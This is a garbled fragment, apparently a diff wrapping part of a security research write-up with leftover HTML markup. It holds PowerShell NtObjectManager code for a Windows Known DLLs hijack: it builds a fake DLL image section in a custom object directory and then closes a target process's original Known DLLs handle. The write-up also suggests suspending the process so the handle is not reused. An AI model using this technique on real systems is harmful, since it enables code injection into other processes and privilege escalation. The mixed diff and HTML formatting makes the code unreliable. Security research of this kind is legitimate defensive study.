@@ -1,4 +1,0 @@
-$dir = New-NtDirectory
-$sect = Use-NtObject($f = Get-NtFile -Path “??\c:\dir\fake.dll”) {
-        New-NtSection -File $f -SectionAttributes Image </div><div>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -Root $dir -Path "blah.dll" -Protection Execute</div><div>&nbsp; &nbsp; }</div><div>}</div></div><div><br /></div><div>Step 3: Close the original Known DLLs handle. Again this only needs Duplicate Handle access. At this point you probably also want to suspend the process to ensure something doesn't execute and allocate the handle over the top of your now closed handle. Of course if you suspend the process you'll need a bit more access.</div><div><br /></div><div><div>$proc = Get-NtProcess -ProcessId $id -Access DupHandle</div><div>Copy-NtObject -SourceHandle $handle -SourceProcess $proc
-                                    -CloseSource
